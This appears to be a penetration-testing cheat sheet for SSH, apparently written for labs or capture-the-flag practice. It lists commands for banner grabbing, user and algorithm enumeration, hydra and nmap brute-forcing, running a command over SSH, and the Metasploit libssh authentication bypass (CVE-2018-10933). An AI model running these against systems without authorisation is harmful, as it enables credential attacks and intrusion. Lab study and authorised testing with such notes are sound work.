# SSH

**SSH  (Secure Shell)**  
**Description**: SSH (Secure Shell) is a protocol used for secure remote login and other secure network services over an insecure network
**Ports**: TCP 22
**Known Vulnerabilities**: Weak credentials (bruteforce), CVE-2018-10933 (libssh authentication bypass), Old OpenSSH vulnerabilities (user enumeration, remote code execution), Misconfigured "none" authentication, Trust relationships (keys without passwords)

<br>

# Banner Grabbing / Initial Check

```shell
nc <target_IP> 22
# Opens a raw TCP connection to port 22 to manually grab the SSH banner and check if the service is alive.

ssh <username>@<target_IP>
# Attempts to initiate an SSH connection using the specified username.

scp <file> david@<target>:"C:\\Users\\david\\"
# Securely copies the file to the remote Windows target's David user folder using SCP.
# Useful for uploading privilege escalation tools during post-exploitation.
```

<br>

# SSH Enumeration

```shell
use auxiliary/scanner/ssh/ssh_version
# Retrieves the SSH server version and banner information.

use auxiliary/scanner/ssh/ssh_enumusers
# Attempts to enumerate valid SSH usernames via timing-based or response-based analysis.

nmap -p 22 --script ssh-enum-algos <target_IP>
# Lists supported SSH encryption algorithms (key exchange, MAC, etc.).

nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <target_IP>
# Displays full SSH host key information, useful for fingerprinting and MITM detection.

nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" <target_IP>
# Checks which authentication methods are allowed for the specified user (e.g., none, password, publickey).

nmap -p 22 --script ssh-brute --script-args userdb=/root/users <target_IP>
# Performs SSH brute-force attacks using a list of usernames.

nmap -p 22 --script ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG,ssh-run.username=student,ssh-run.password=" <target_IP>
# Attempts to run a command over SSH using provided credentials.
```

<br>

# SSH Brute-force Login

```shell
hydra -L <user_wordlists> -P <pass_wordlist> -t 4 <target_IP> ssh
# Performs a brute-force attack on SSH using lists of usernames and passwords with 4 parallel threads.

use auxiliary/scanner/ssh/ssh_login
# Attempts SSH login with provided username and password combinations to identify valid credentials.
```

<br>

# Exploiting SSH Vulnerabilities

```shell
use auxiliary/scanner/ssh/libssh_auth_bypass
# Scans for systems vulnerable to the libssh authentication bypass (CVE-2018-10933).
# Allows login without credentials if the server is improperly configured.
set SPAWN_PTY true # Spawn a pseudo-terminal upon successful login
```

